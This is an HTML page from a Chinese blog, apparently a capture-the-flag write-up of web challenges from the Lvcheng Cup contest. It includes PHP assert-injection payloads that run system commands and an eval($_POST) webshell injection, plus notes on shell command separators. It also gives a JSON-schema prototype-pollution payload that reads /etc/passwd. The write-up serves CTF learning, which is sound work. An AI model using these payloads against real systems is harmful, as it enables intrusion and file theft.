@@ -1,0 +1,635 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="keep something">
+  <meta name="author" content="luom">
+  <meta name="keywords" content="">
+  <title>绿城杯Web部分WP - RC9&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"romanc9.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"nC7Rtx8EoAwWlShCEwdRsumO-gzGzoHsz","app_key":"sqlnn9nfpy9eU5bkSY3Rpkyb","server_url":"https://nc7rtx8e.lc-cn-n1-shared.com"}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Romanc9's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/post.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="绿城杯Web部分WP">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-09-29 19:14" pubdate>
+        2021年9月29日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      13
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- LeanCloud 统计文章PV -->
+      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="leancloud-page-views"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">绿城杯Web部分WP</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2024年1月6日 晚上
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h2 id="ezphp">ezphp</h2>
+<ul>
+<li><p>收获：rce，代码执行</p>
+<ul>
+<li><p>⭕通过代码执行或命令执行写Shell：https://www.bilibili.com/read/cv11569998</p></li>
+<li><p>https://blog.csdn.net/qq_46150940/article/details/110044575</p></li>
+</ul></li>
+<li><p>差不多原题：https://blog.csdn.net/About23/article/details/95075416
+、https://www.jianshu.com/p/47bbfaf3f2d9</p></li>
+</ul>
+<h3 id="知识点">知识点</h3>
+<ul>
+<li><p>php运算符及优先级：https://www.php.net/manual/zh/language.operators.logical.php</p></li>
+<li><p>bool or
+bool这样的语句中，如果前一个值为真后一个值就不会再判断了</p></li>
+<li><p>assert assert ( mixed $assertion [, Throwable $exception ] ) :
+bool——— assert — 检查一个断言是否为
+FALSE，如果是false，返回1，否则返回0</p>
+<ul>
+<li>如果参数是字符串，它将会被 assert() 当做 PHP 代码来执行</li>
+</ul></li>
+<li><p>strpos 如果没找到 needle，将返回 false。</p></li>
+</ul>
+<h3 id="解题">解题</h3>
+<ul>
+<li>assert($safe_check1) or die("no no no!");
+<ul>
+<li>只有assert为真才不会die，assert参数为false才返回1。符合假定则就不会die</li>
+</ul></li>
+<li>所以只要闭合assert右括号，并注释掉die即可
+<ul>
+<li>assert(" strpos('pages/flag','..')||phpinfo();//.php ', '..') ===
+false ")</li>
+</ul></li>
+<li>输入')||phpinfo();//，代码执行，显示phpinfo=》命令执行</li>
+</ul>
+<h4 id="解法1在源码里php会被执行">解法1：在源码里！！php会被执行！</h4>
+<ul>
+<li><p>index.php跟pages文件夹在同一目录下，注意加上./!，下面的都可以！</p>
+<ul>
+<li><p>')||system('cat ./pages/flag.php');//</p></li>
+<li><p>1','1')||system('cat ./pages/flag.php');//</p></li>
+<li><p>flag','.')||system('cat pages/flag.php');//</p></li>
+<li><p>')||eval("system('cat ./pages/flag.php');");//</p></li>
+<li><p>')||print_r(file_get_contents('./pages/flag.php'));//</p></li>
+</ul></li>
+<li><p>url：view-source:http://e6e8c804-8ce5-4caa-9940-411be14f96fb.zzctf.dasctf.com/?link_page=1%27,%271%27)||system(%27cat%20./pages/flag.php%27);//<img src="https://api2.mubu.com/v3/document_image/756e8572-0051-4ab5-86f6-a50f4ad45031-11812322.jpg" srcset="/img/loading.gif"><img src="https://api2.mubu.com/v3/document_image/47729fa1-eb75-44e3-a60b-788116c9f2b4-11812322.jpg" srcset="/img/loading.gif"></p></li>
+<li><p>flag找到//DASCTF{c804c562fffd14c6ae757e07b30126ee}</p></li>
+</ul>
+<h4 id="解法2">解法2</h4>
+<p>也可用蚁剑?link_page=flag.php', '..') ===
+true|eval($_POST['yy']);//，post传参yy=system('ls /');，密码yy</p>
+<ul>
+<li><p>在Linux上， ; 可以用 |、|| 代替</p>
+<ul>
+<li><p>;前面的执行完执行后面的</p></li>
+<li><p>|是管道符，显示后面的执行结果</p></li>
+<li><p>||当前面的执行出错时执行后面的</p></li>
+</ul></li>
+<li><p>在Windows上，不能用 ; 可以用&amp;、&amp;&amp;、|、||代替</p>
+<ul>
+<li><p>&amp;前面的语句为假则直接执行后面的</p></li>
+<li><p>&amp;&amp;前面的语句为假则直接出错，后面的也不执行</p></li>
+<li><p>|直接执行后面的语句</p></li>
+<li><p>||前面出错执行后面的</p></li>
+</ul></li>
+</ul>
+<h2 id="easyjava">easyjava</h2>
+<ul>
+<li><p>wp：https://ha1c9on.top/2021/09/29/2021-lvcvheng-ezjava/</p></li>
+<li><p>wp2：https://www.wolai.com/atao/i6PwXQdpbcwBeXvJVLrjMr</p></li>
+</ul>
+<h2 id="easycms">easycms</h2>
+<ul>
+<li><p>http://240ecfdd-1600-46bb-99cc-c5c21cc46f55.zzctf.dasctf.com/</p></li>
+<li><p>wp</p>
+<ul>
+<li>https://guokeya.github.io/post/8ZEuy4BXz/</li>
+</ul></li>
+</ul>
+<h2 id="looking-for-treasure">Looking for treasure</h2>
+<ul>
+<li><p>考点：源码审计、json-schema原型链污染</p></li>
+<li><p>wp：https://blog.csdn.net/weixin_52091458/article/details/120560406</p></li>
+<li><p>js知识点</p>
+<ul>
+<li><p>let命令，用来声明局部变量，类似于var，但var是全局变量，let是花括号内局部变量</p></li>
+<li><p>console.log()，输出括号里的东西</p></li>
+<li><p>req.body是用在post请求当中得到请求体</p></li>
+<li><p>lodash是java的原生库，里面有很多方法（函数）可以用</p></li>
+<li><p>object.toString()，以字符串的形式返回对象内容</p></li>
+<li><p>JSON.parse() 方法将数据转换为 JavaScript 对象。</p></li>
+<li><p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903920976789511">Express中
+res.json及res.send()</a>，都是发送内容到http响应body里，但可能因类型不同导致Content-Type
+不同</p></li>
+<li><p>获取url参数：/path/:id,参数在req.params.id中，/path?id=xx,参数在req.query.id中，：表示后面的是参数</p></li>
+<li><p>逻辑非运算符!
+&gt;逻辑或运算符||，先非后或，或只要前面是true则不会执行后面</p></li>
+<li><p>JSON Schema本身是是JSON数据的规范/模板，是一种数据结构</p></li>
+<li><p>⭕原型链污染</p>
+<ul>
+<li><p>https://www.cnblogs.com/l0nmar/p/13951739.html</p></li>
+<li><p>Defcon CTF Final Web wp（部分原题）：<a target="_blank" rel="noopener" href="https://0day.design/2020/08/11/defcon%20CTF%20Final%20Web%20WriteUp/">https://0day.design/2020/08/11/defcon%20CTF%20Final%20Web%20WriteUp/</a></p></li>
+<li><p>知识库，少：https://wiki.wgpsec.org/knowledge/ctf/js-prototype-chain-pollution.html</p></li>
+<li><p>freebuf https://www.freebuf.com/articles/web/264966.html</p></li>
+</ul></li>
+</ul></li>
+</ul>
+<h3 id="解题-1">解题</h3>
+<ul>
+<li><p>fs.readFileSync()方法是fs模块的内置应用程序编程接口，用于读取文件并返回其内容。</p>
+<ul>
+<li><p>这里读取了p文件，如果能控制p的值就能实现文件读取。</p>
+<ul>
+<li>lodash.isEqual(req.body,
+content)，检查post的body是否与读取的文件内容相同，这个肯定是不相同的不用管它
+，所以p的内容最后会在报错信息的content里发出，以这种形式res.send({
+"validator": valid, "content" : content, "log": "wrong content"})</li>
+</ul></li>
+<li><p>p怎么来的，config.path给p赋值。所以得想办法控制path的值。<img src="https://api2.mubu.com/v3/document_image/c13adcb2-dab3-4d12-8452-fb2f1c7025e5-11812322.jpg" srcset="/img/loading.gif"></p></li>
+<li><p>一开始url无参数，!req.params.library为true，直接req.params.library
+= "json-schema";</p></li>
+<li><p>看到这个想到json-schema原型链污染</p></li>
+</ul></li>
+<li><p>payload</p>
+<ul>
+<li>{"$schema":{"type":"object","properties":{"<strong>proto</strong>":{"type":"object","properties":{"path":{"type":"string","default":"/etc/passwd"}}}}}}
+<ul>
+<li>default后面的字符串可控<img src="https://api2.mubu.com/v3/document_image/5c821c1d-dd7e-470f-b7d3-514c870dea79-11812322.jpg" srcset="/img/loading.gif"></li>
+</ul></li>
+<li>DASCTF{5117143e660f592adc982dd96d2c3f17}</li>
+</ul></li>
+</ul>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/CTF-%E6%AF%94%E8%B5%9B/">CTF,比赛</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/10/09/python%E5%8F%91%E9%80%81request%E5%8C%85/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">python发送request包&ctf</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/09/16/%E9%99%87%E5%89%91%E6%9D%AF%E9%83%A8%E5%88%86WP/">
+                        <span class="hidden-mobile">陇剑杯部分WP</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/Romanc9" target="_blank" rel="nofollow noopener"><span>Luoman</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
